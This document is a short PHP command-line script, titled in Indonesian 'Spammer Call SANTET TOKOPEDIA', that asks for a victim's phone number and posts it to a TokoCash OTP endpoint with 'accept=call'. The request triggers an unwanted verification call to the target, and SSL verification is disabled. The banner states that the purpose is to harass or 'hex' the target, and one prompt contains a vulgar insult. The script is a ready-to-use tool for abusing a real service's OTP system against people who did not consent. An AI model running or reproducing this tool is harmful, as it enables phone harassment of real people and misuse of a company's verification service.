<?php
// SANTET SECUKUPNYA
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
    Spammer Call SANTET TOKOPEDIA
        Author By   : ™иs°d̸αRαᴮᵀᴺ
        Email       : Totonngesot@gmail.com
        Fb          : SUGARA
        Tujuan      : SANTET
        My Team     : NO SKILL
     Penggunaannya  : Bisa Menggunakan [08/62]
###########################################################\n";
echo "MASUKAN NMR YANG INGIN DI SANTET\nTULIS NOMORNYA KONTOL : ";
$nomor = trim(fgets(STDIN));
echo "Target: $nomer(y/n)";
$cek = trim(fgets(STDIN));
if($cek=="n") exit("Stopped!\n");
$execute = send($nomor);
print $execute;
?>












